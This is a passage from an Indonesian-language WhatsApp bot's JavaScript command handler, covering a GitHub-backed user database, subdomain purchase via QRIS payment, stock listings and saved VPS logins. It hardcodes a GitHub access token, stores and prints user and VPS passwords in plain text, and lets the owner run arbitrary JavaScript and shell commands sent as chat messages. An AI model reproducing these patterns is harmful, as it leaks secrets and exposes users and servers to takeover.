 const jsonData = await response.json();

 // Validasi apakah struktur data sudah benar
 if (!jsonData || typeof jsonData !== 'object') {
 return m.reply('❌ Struktur data tidak valid.');
 }

 // Cek apakah nomor sudah ada di database
 if (jsonData[phoneNumber]) {
 return m.reply(`❌ Nomor ${phoneNumber} sudah ada di database.`);
 }

 // Tambahkan data baru ke JSON
 jsonData[phoneNumber] = { name, password };

 // Encode data JSON menjadi base64 untuk diupload ke GitHub
 const updatedData = JSON.stringify(jsonData, null, 2); // Format JSON dengan indentation 2 spasi
 const base64Content = Buffer.from(updatedData).toString('base64'); // Encode ke base64

 // Ambil SHA dari file GitHub yang ada
 const shaResponse = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`);
 const shaData = await shaResponse.json();
 const currentSHA = shaData.sha; // SHA file yang ada

 // Update file di GitHub
 const updateResponse = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`, {
 method: 'PUT',
 headers: {
 'Authorization': `Bearer ${GITHUB_TOKEN}`,
 'Content-Type': 'application/json',
 },
 body: JSON.stringify({
 message: `Menambahkan nomor ${phoneNumber} ke database`,
 content: base64Content,
 sha: currentSHA, // SHA file yang ada
 }),
 });

 const updateResult = await updateResponse.json();

 if (updateResponse.status === 200) {
 return m.reply(`✅ Nomor ${phoneNumber} dengan nama "${name}" dan password "${password}" berhasil ditambahkan ke database.`);
 } else {
 throw new Error(`Error menambahkan data: ${updateResult.message}`);
 }

 } catch (error) {
 console.error(error);
 return m.reply(`❌ Error: ${error.message}`);
 }
}
break;
 
case 'deldb2': {
if (!isCreator) return m.reply('Khusus Owner Script')
 if (!q) return m.reply('❌ Anda harus mengirimkan data dalam format: nomor|nama|password.');
 const [phoneNumber, name, password] = q.split('|').map(item => item.trim());
 
 if (!phoneNumber || !name || !password) {
 return m.reply('❌ Format tidak valid. Gunakan format: nomor|nama|password.');
 }
 
 const GITHUB_TOKEN = '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'; // Ganti dengan token GitHub Anda
 const REPO_OWNER = 'ZatromHub'; // Ganti dengan username GitHub Anda
 const REPO_NAME = 'DataBase-'; // Ganti dengan nama repositori Anda
 const FILE_PATH = 'datauser.json'; // Path ke file JSON di repositori Anda
 
 try {
 const response = await fetch(`https://raw.githubusercontent.com/${REPO_OWNER}/${REPO_NAME}/main/${FILE_PATH}`);
 const jsonData = await response.json();
 
 if (!jsonData || typeof jsonData !== 'object') {
 return m.reply('❌ Struktur data tidak valid.');
 }
 
 if (!jsonData[phoneNumber]) {
 return m.reply(`❌ Nomor ${phoneNumber} tidak ada di database.`);
 }
 
 delete jsonData[phoneNumber];
 
 const updatedData = JSON.stringify(jsonData, null, 2);
 const base64Content = Buffer.from(updatedData).toString('base64');
 
 const shaResponse = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`);
 const shaData = await shaResponse.json();
 const currentSHA = shaData.sha;
 
 const updateResponse = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`, {
 method: 'PUT',
 headers: {
 'Authorization': `Bearer ${GITHUB_TOKEN}`,
 'Content-Type': 'application/json',
 },
 body: JSON.stringify({
 message: `Menghapus nomor ${phoneNumber} dari database`,
 content: base64Content,
 sha: currentSHA,
 }),
 });
 
 const updateResult = await updateResponse.json();
 
 if (updateResponse.status === 200) {
 return m.reply(`✅ Nomor ${phoneNumber} berhasil dihapus dari database.`);
 } else {
 throw new Error(`Error menghapus data: ${updateResult.message}`);
 }
 } catch (error) {
 console.error(error);
 return m.reply(`❌ Error: ${error.message}`);
 }
} break;

case 'listdb2': {
if (!isCreator) return m.reply('Khusus Owner Script')
 const GITHUB_TOKEN = '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'; // Ganti dengan token GitHub Anda
 const REPO_OWNER = 'ZatromHub'; // Ganti dengan username GitHub Anda
 const REPO_NAME = 'DataBase-'; // Ganti dengan nama repositori Anda
 const FILE_PATH = 'datauser.json'; // Path ke file JSON di repositori Anda

 try {
 const response = await fetch(`https://raw.githubusercontent.com/${REPO_OWNER}/${REPO_NAME}/main/${FILE_PATH}`);
 const jsonData = await response.json();

 if (!jsonData || typeof jsonData !== 'object') {
 return m.reply('❌ Struktur data tidak valid.');
 }

 const dataList = Object.keys(jsonData).map((key) => {
 return `Nomor: ${key}\nNama: ${jsonData[key].name}\nPassword: ${jsonData[key].password}\n\n`;
 }).join('');

 return m.reply(`✅ Berikut adalah daftar data:\n\n${dataList}`);
 } catch (error) {
 console.error(error);
 return m.reply(`❌ Error: ${error.message}`);
 }
} 
break;

case 'buysubdomain': 
case 'buysubdo': {
    if (m.isGroup) return m.reply("Pembelian hanya bisa di dalam private chat");
    if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik .batalbeli untuk membatalkan transaksi sebelumnya!");

    if (!text) return m.reply("Format salah! Gunakan: *subdomain|ipserver*");
    let [host, ip] = text.split("|");
    if (!host || !ip) return m.reply("Format salah! Gunakan: *subdomain|ipserver*");

    // Menentukan harga
    const harga = 5000;
    const amount = harga + generateRandomNumber(110, 250); // Penyesuaian unik harga
    const UrlQr = global.qrisOrderKuota;

    // Request pembayaran ke API
    const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`);

    if (!get.data.result) return m.reply("Gagal membuat pembayaran, coba lagi nanti.");

    const teksPembayaran = `
    *📌 INFORMASI PEMBAYARAN*

    *• ID Transaksi:* ${get.data.result.transactionId}
    *• Total Pembayaran:* Rp${await toIDR(get.data.result.amount)}
    *• Paket:* Subdomain
    *• Expired:* 5 menit

    📌 *Note:* Pembayaran hanya berlaku dalam 5 menit. Jika pembayaran berhasil, bot akan otomatis mengkonfirmasi status pembayaran kamu.
    Ketik *.batalbeli* untuk membatalkan.
    `;

    let msgQr = await conn.sendMessage(m.chat, {
        footer: `© 2025 ${botname}`,
        buttons: [{ buttonId: `.batalbeli`, buttonText: { displayText: '❌ Batalkan Pembelian' }, type: 1 }],
        headerType: 1,
        viewOnce: true,
        image: { url: get.data.result.qrImageUrl },
        caption: teksPembayaran,
        contextInfo: { mentionedJid: [m.sender] },
    });

    // Simpan status transaksi dalam database
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        host,
        ip,
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await conn.sendMessage(db.users[m.sender].saweria.chat, { text: "⚠️ QRIS Pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
                    await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].saweria;
                }
            }, 300000);
        },
    };

    await db.users[m.sender].saweria.exp();

    // Loop pengecekan status pembayaran
    while (db.users[m.sender].status_deposit) {
        await sleep(8000);
        const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = resultcek.data;

        if (req?.amount == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;
            await conn.sendMessage(db.users[m.sender].saweria.chat, {
                text: `✅ *PEMBAYARAN BERHASIL!*\n\n*• ID:* ${db.users[m.sender].saweria.idDeposit}\n*• Total:* Rp${await toIDR(db.users[m.sender].saweria.amount)}\n*• Paket:* Subdomain\n\n📌 Silakan pilih domain yang tersedia:`
            }, { quoted: db.users[m.sender].saweria.msg });

            // Ambil daftar domain yang tersedia
            let dom = Object.keys(global.subdomain);
            let list = [];
            for (let i of dom) {
                list.push({
                    title: i,
                    id: `.domain ${dom.indexOf(i) + 1} ${host}|${ip}`
                });
            }

            // Kirim tombol interaktif Pilih Domain
            await conn.sendMessage(m.chat, {
                buttons: [
                    {
                        buttonId: 'action',
                        buttonText: { displayText: '🌍 Pilih Domain' },
                        type: 4,
                        nativeFlowInfo: {
                            name: 'single_select',
                            paramsJson: JSON.stringify({
                                title: 'Pilih Domain',
                                sections: [
                                    {
                                        title: 'List Domain',
                                        highlight_label: 'Recommended',
                                        rows: [...list]
                                    }
                                ]
                            })
                        }
                    }
                ],
                footer: `© 2025 ${botname}`,
                headerType: 1,
                viewOnce: true,
                text: "Pilih Domain Yang Tersedia\n",
                contextInfo: {
                    isForwarded: true,
                    mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],
                },
            });

            delete db.users[m.sender].saweria;
        }
    }
}
break;

case 'subdomain': case "subdo": {
    if (!isCreator && !isSeller) {
        await conn.sendMessage(m.chat, {
            buttons: [
                {
                    buttonId: '.buypremium',
                    buttonText: { displayText: '💎 Beli Akses Premium' },
                    type: 1
                }
            ],
            footer: `© 2025 ${botname}`,
            headerType: 1,
            viewOnce: true,
            text: `Haii @${m.sender.split("@")[0]}, Maaf Anda belum memiliki akses Premium Subdomain.\n\n🔹 Jika ingin mengakses Subdomain, silakan beli akses Premium dengan menekan tombol di bawah ini atau ketik * .buypremium *`,
            contextInfo: {
                isForwarded: true,
                mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],
            },
        }, { quoted: qtext2 });
        return;
    }

    if (!text) return m.reply(example("rafatharcode|ipserver"));
    if (!text.split("|")) return m.reply(example("skyzoo|ipserver"));

    let [host, ip] = text.split("|");
    let dom = await Object.keys(global.subdomain);
    let list = [];
    for (let i of dom) {
        await list.push({
            title: i,
            id: `.domain ${dom.indexOf(i) + 1} ${host}|${ip}`
        });
    }

    await conn.sendMessage(m.chat, {
        buttons: [
            {
                buttonId: 'action',
                buttonText: { displayText: '🌍 Pilih Domain' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: 'Pilih Domain',
                        sections: [
                            {
                                title: 'List Domain',
                                highlight_label: 'Recommended',
                                rows: [...list]
                            }
                        ]
                    })
                }
            }
        ],
        footer: `© 2025 ${botname}`,
        headerType: 1,
        viewOnce: true,
        text: "Pilih Domain Yang Tersedia\n",
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],
        },
    }, { quoted: qtext2 });
}
break;




case 'mediafire': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("linknya"))
if (!text.includes('mediafire.com')) return m.reply("Link tautan tidak valid")
await mediafire(text).then(async (res) => {
if (!res.link) return m.reply("Error! Result Not Found")
await conn.sendMessage(m.chat, {document: {url: res.link}, fileName: res.judul, mimetype: "application/"+res.mime.toLowerCase()}, {quoted: m})
}).catch((e) => m.reply("Error"))
}
break

case 'stockdo':
case 'liststockdo':
case 'stockdigitalocean':
case 'liststockdigitalocean': { 
    if (cekUser("id", m.sender) == null) return conn.sendMessage(from, { 
        text: `⚠️ Maaf *@${m.sender.split('@')[0]}* ❗\nSepertinya kamu belum terdaftar di database 📂\n\nSilahkan ketik *.daftar* terlebih dahulu sebelum menggunakan perintah *${command}* ✅`, 
        mentions: [m.sender] 
    }, { quoted: qtext2 });

    try { 
        // Baca file JSON 
        let daftarBarang = JSON.parse(fs.readFileSync('./library/database/datado.json', 'utf8')); 

        if (daftarBarang.length === 0) { 
            return m.reply('❌ Tidak ada barang yang terdaftar.'); 
        } 

        // Susun daftar barang 
        let teks = '📋 *Daftar Stok DigitalOcean:*\n\n'; 
        let buttonRows = []; // Array untuk tombol pemilihan barang 

        daftarBarang.forEach((item, i) => { 
            teks += `📦 ${i + 1}. *Kode:* ${item.kodebarang}\n` + 
                    `🏷️ *Nama:* ${item.namabarang}\n` + 
                    `💰 *Harga:* ${item.hargabarang}\n` + 
                    `📦 *Stok:* ${item.stockbarang}\n` + 
                    `☁️ *Droplet:* ${item.dropletbarang || 'Tidak tersedia'}\n\n`; 

            // Tambahkan item ke dalam tombol jika stok tersedia 
            if (item.stockbarang > 0) { 
                buttonRows.push({ 
                    title: `${item.namabarang} - ${item.hargabarang}`, 
                    id: `.buystockdo ${item.kodebarang}` 
                }); 
            } 
        }); 

        teks += 'ℹ️ *Cara Membeli:*\n' + 
                'Silakan pilih barang yang tersedia dari daftar di bawah atau gunakan perintah manual:\n' + 
                '🛒 _*.buystockdo [kodebarang]*_\n\n' + 
                'Contoh: _*.buystockdo ABC123*_\n\n' + 
                'Pastikan kode barang sesuai dengan daftar di atas. ✅'; 

        // Kirim daftar stok dan tombol pemilihan barang 
        await conn.sendMessage(m.chat, { 
            footer: `© 2025 ${botname}`, 
            buttons: [ 
                { 
                    buttonId: 'action', 
                    buttonText: { displayText: 'Pilih Barang untuk Dibeli' }, 
                    type: 4, 
                    nativeFlowInfo: { 
                        name: 'single_select', 
                        paramsJson: JSON.stringify({ 
                            title: 'Pilih Barang yang Tersedia', 
                            sections: [{ title: 'Barang Tersedia', rows: buttonRows }] 
                        }) 
                    } 
                } 
            ], 
            headerType: 1, 
            viewOnce: true, 
            image: { url: global.image.reply }, 
            caption: teks + "\n\n```Atau Bisa Memilih Langsung Dibawah Ini.```\n" 
        }, { quoted: m }); 

    } catch (error) { 
        console.error("❌ Error saat membaca daftar barang:", error); 
        m.reply('⚠️ Terjadi kesalahan saat membaca daftar barang.'); 
    } 
} 
break;

case 'liststock': 
case 'stock': { 
if (cekUser("id", m.sender) == null) return conn.sendMessage(from, { 
    text: `⚠️ Maaf *@${m.sender.split('@')[0]}* ❗\nSepertinya kamu belum terdaftar di database 📂\n\nSilahkan ketik *.daftar* terlebih dahulu sebelum menggunakan perintah *${command}* ✅`, 
    mentions: [m.sender] 
}, { quoted: qtext2 });
 try { 
 // Baca file JSON 
 let daftarBarang = JSON.parse(fs.readFileSync('./library/database/databarang.json', 'utf8')); 

 if (daftarBarang.length === 0) { 
 return m.reply('❌ Tidak ada barang yang terdaftar.'); 
 } 

 // Susun daftar barang 
 let teks = '📋 *Daftar Stok Barang:*\n\n'; 
 let buttonRows = []; // Array untuk tombol pemilihan barang 

 daftarBarang.forEach((item, i) => { 
 teks += `📦 ${i + 1}. *Kode:* ${item.kodebarang}\n 🏷️ *Nama:* ${item.namabarang}\n 💰 *Harga:* ${item.hargabarang}\n 📦 *Stok:* ${item.stockbarang}\n\n`; 

 // Tambahkan item ke dalam tombol jika stok tersedia 
 if (item.stockbarang > 0) { 
 buttonRows.push({ 
 title: `${item.namabarang} - ${item.hargabarang}`, 
 id: `.buystock ${item.kodebarang}` 
 }); 
 } 
 }); 

 teks += 'ℹ️ *Cara Membeli:*\n' + 
 'Silakan pilih barang yang tersedia dari daftar di bawah atau gunakan perintah manual:\n' + 
 '🛒 _*.buystock [kodebarang]*_\n\n' + 
 'Contoh: _*.buystock ABC123*_\n\n' + 
 'Pastikan kode barang sesuai dengan daftar di atas. ✅'; 

 // Kirim daftar stok dan tombol pemilihan barang 
 await conn.sendMessage(m.chat, { 
 footer: `© 2025 ${botname}`, 
 buttons: [ 
 { 
 buttonId: 'action', 
 buttonText: { displayText: 'Pilih Barang untuk Dibeli' }, 
 type: 4, 
 nativeFlowInfo: { 
 name: 'single_select', 
 paramsJson: JSON.stringify({ 
 title: 'Pilih Barang yang Tersedia', 
 sections: [{ title: 'Barang Tersedia', rows: buttonRows }] 
 }) 
 } 
 } 
 ], 
 headerType: 1, 
 viewOnce: true, 
 image: { url: global.image.reply }, 
 caption: teks + "\n\n```Atau Bisa Memilih Langsung Dibawah Ini.```\n" 
 }, { quoted: m }); 

 } catch (error) { 
 console.error("❌ Error saat membaca daftar barang:", error); 
 m.reply('⚠️ Terjadi kesalahan saat membaca daftar barang.'); 
 } 
} 
break

;

;

;

case 'totalsavevps': {
 try {
 if (!isCreator) {
 return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");
 }

 const path = './src/savevps.json';

 // Memuat data dari file JSON
 let vpsData = [];
 if (fs.existsSync(path)) {
 try {
 vpsData = JSON.parse(fs.readFileSync(path));
 } catch (error) {
 console.error("Error loading VPS data:", error);
 return Reply("⚠️ *Gagal membaca data VPS.*");
 }
 }

 // Menampilkan jumlah total data VPS yang tersimpan
 Reply(`📊 *Total Data VPS Tersimpan:* ${vpsData.length}`);
 } catch (error) {
 console.error("Error saat membaca total VPS:", error);
 Reply("⚠️ *Terjadi kesalahan saat membaca total data VPS. Silakan coba lagi!*");
 }
}
break;

case 'editsavevps': {
 try {
 if (!isCreator) {
 return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");
 }

 const path = './src/savevps.json';

 // Memuat data dari file JSON
 let vpsData = [];
 if (fs.existsSync(path)) {
 try {
 vpsData = JSON.parse(fs.readFileSync(path));
 } catch (error) {
 console.error("Error loading VPS data:", error);
 return Reply("⚠️ *Gagal membaca data VPS.*");
 }
 }

 const t = text.split(',').map(item => item.trim());
 if (t.length < 3) {
 return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} teks,ipvps,pwvps`);
 }

 const [teks, ipvps, pwvps] = t;

 // Mencari data VPS berdasarkan teks
 const index = vpsData.findIndex(item => item.teks === teks);
 if (index === -1) {
 return Reply(`⚠️ *Data VPS dengan teks "${teks}" tidak ditemukan!*`);
 }

 // Perbarui data yang ditemukan
 vpsData[index] = { teks, ipvps, pwvps };

 // Simpan kembali ke file JSON
 try {
 fs.writeFileSync(path, JSON.stringify(vpsData, null, 2));
 } catch (error) {
 console.error("Error saving VPS data:", error);
 return Reply("⚠️ *Terjadi kesalahan saat menyimpan data VPS.*");
 }

 Reply(`✅ *Data VPS berhasil diperbarui!*\n\n📌 *Teks:* ${teks}\n🔗 *IP VPS:* ${ipvps}\n🔑 *Password VPS:* ${pwvps}`);
 } catch (error) {
 console.error("Error saat mengedit VPS:", error);
 Reply("⚠️ *Terjadi kesalahan saat mengedit data VPS. Silakan coba lagi!*");
 }
}
break;

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (m.text.toLowerCase() == "bot") {
m.reply("Online Kak ✅")
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith(' ')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
}
} catch (err) {
console.log(util.format(err));
conn.sendMessage("62895373974000@s.whatsapp.net", {text: `*Hallo developer, telah terjadi error pada command :* ${isCmd ? prefix+command : m.text}

*Detail informasi error :*
${util.format(err)}`, contextInfo: { isForwarded: true }}, {quoted: m})
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});